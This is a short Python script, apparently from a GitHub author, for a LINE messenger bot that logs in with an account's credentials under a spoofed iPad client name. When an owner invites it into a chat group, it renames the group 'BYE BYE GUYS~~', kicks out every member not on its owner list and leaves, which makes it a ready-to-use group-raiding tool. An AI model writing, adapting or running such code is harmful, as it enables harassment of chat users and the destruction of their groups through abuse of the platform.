# -*- coding: utf-8 -*-
'''
Creator by L.H.
Github : https://github.com/YiJhu
line https://line.me/R/ti/p/C0zqAO9i7j
'''
from core import *

######
account = ''#put account mail
password = ''#put account password
Kick_Group_Name = ["BYE BYE GUYS~~"]#put Change Name
Auth = ''#put auth mid
######

BOT = LINE(idOrAuthToken=account, passwd=password, appName='IOSIPAD\t9.12.0\tLH Super Core\t11.2.5', systemName='LH Super Core')
Owner = 'u9b035730aeb9d17410d96e95ad2503b8'
TOP = Owner + Auth
tracer = OEPoll(BOT)
Mid = BOT.profile.mid

def NOTIFIED_INVITE_INTO_GROUP(op):
    try:
        if Mid in op.param3:
            if op.param2 in TOP:
                BOT.acceptGroupInvitation(op.param1)
                X = BOT.getGroup(op.param1)
                X.name = Kick_Group_Name
                BOT.updateGroup(X)
                for x in X.members:
                    if not x.mid in TOP:
                        BOT.kickoutFromGroup(op.param1, [str(x.mid)])
                BOT.leaveGroup(op.param1)
            else:
                pass
    except Exception as e:
        print(e)
tracer.addOpInterrupt(13,NOTIFIED_INVITE_INTO_GROUP)

while True:
    tracer.trace()
